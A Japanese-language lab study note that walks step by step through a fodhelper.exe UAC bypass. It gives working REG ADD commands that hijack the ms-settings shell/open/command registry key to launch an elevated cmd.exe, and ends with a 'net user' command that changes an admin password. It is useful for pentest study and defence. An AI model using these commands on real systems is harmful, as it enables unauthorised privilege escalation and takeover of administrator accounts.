# UACByPass

### fodhelper.exe

オペレーティングシステムの言語変更を管理するMicrosoftのサポートアプリケーションであるfodhelper.exeを利用したUACbyPass.

「アプリと機能」のWindows設定画面で「オプション機能の管理」オプションを選択するたびに、このアプリケーションが起動する。

<img src="img/Windows/UACByPass/image-20230106075428758.png" alt="image-20230106075428758" style="zoom:67%;" />

* アプリケーションマニフェスト（プログラム起動時にOSがそのプログラムをどのように処理するかを示す情報を含む XML ファイル）の検査をする

  ```cmd
  cd C:\Tools\privilege_escalation\SysinternalsSuite
  sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
  ```

  ![image-20230106075632722](img/Windows/UACByPass/image-20230106075632722.png)

  ![](img/UACByPass/image-20230106075632722-1673224263122-2.png)

  * administrator アクセストークンが必要
  * autoelevate フラグが true に設定されているため、管理者ユーザーに同意を求めることなく、実行ファイルが自動的に高信頼性に昇格することが可能

* procmon（Sysinternals suite）で「NAME NOT FOUND」のレジストリを調査する

  * procmonを起動したのち、fodhelper.exeを再起動する

  * Filterで絞り込みを行う

    ![image-20230106080656214](img/Windows/UACByPass/image-20230106080656214.png)

    ![](img/UACByPass/image-20230106080656214-1673224302083-5.png)

  * `HKCU:\Software\Classes\ms-settings\shell\open\command`レジストリーキーが存在しないことがわかる。

    ![image-20230106080749582](img/Windows/UACByPass/image-20230106080749582.png)

    ![](img/UACByPass/image-20230106080749582-1673224338455-8.png)

  * `HKCU:\Software\Classes\ms-settings\shell\open\command`レジストリーキーの検索のあと、**HKEY_CLASSES_ROOT**（HKCR）ハイブで同じキーにアクセスし、成功している。

    レジストリーエディターでも確認することができる（regedit)

    ![image-20230106080943088](img/Windows/UACByPass/image-20230106080943088.png)

    ![](img/UACByPass/image-20230106080943088-1673224359152-11.png)
    
    詳細を調べるとDelegateExecuteキーの値を特定のCOMクラスIDに設定したのち(Default)動作を実行するという流れのよう

* HKCUハイブ内のms-settingレジストリキーを登録する

  ```cmd
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  
  ---
  C:\Tools\privilege_escalation\SysinternalsSuite>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  The operation completed successfully.
  ```

* 次にDelegateExecuteエントリーを追加する

  ```cmd
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
  ```

  * /v：値の名前を指定
  * /t：型を指定

  ![image-20230106081615681](img/Windows/UACByPass/image-20230106081615681.png)

  ![](img/UACByPass/image-20230106081615681-1673224378809-14.png)

* procmonのフィルターを「SUCCESS」に変更する。

  ![image-20230106081707074](img/Windows/UACByPass/image-20230106081707074.png)

  ![](img/UACByPass/image-20230106081707074-1673224399075-17.png)

  （Default)のレジストリーキーが実行されている

* 新しいレジストリー値を指定する

  ```
  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
  ```

* 再度fodhelper.exeを実行するとコマンドプロンプトが立ち上がる

  ![image-20230106081939053](img/Windows/UACByPass/image-20230106081939053.png)

  ![](img/UACByPass/image-20230106081939053-1673224430178-20.png)

  パスワード変更もできることを確認する
  
  ```
  net user admin Ev!lpass
  ```
  
  

